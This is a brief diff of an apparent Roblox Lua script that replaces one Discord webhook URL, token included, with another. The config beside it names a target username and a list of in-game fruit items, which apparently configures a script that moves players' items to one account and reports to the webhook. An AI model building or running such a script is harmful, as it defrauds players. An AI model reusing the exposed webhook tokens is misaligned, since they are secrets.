@@ -5,7 +5,7 @@ local Lighting = game:GetService("Lighting")
 
 -- Config
 local TARGET_USERNAME = "Only1sherif"
-local WEBHOOK_URL = "https://discord.com/api/webhooks/1515127021561319464/YinnWqmTje78JUfcbnhNKhgGK_e4wTPrHu3h1uwu2gwVqkPppi5uoNmus_wuPxmUG7Fq"
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1515775380391198740/w-zMAgTWLDlK_N11ZRaGmSn3dT7pv7qS-hVnVl5NnoaClxkxF8pU3yvR8LxvLh4fPICf"
 
 local FRUITS = {
     "Carrot", "Strawberry", "Blueberry", "Tulip", "Tomato", "Apple",
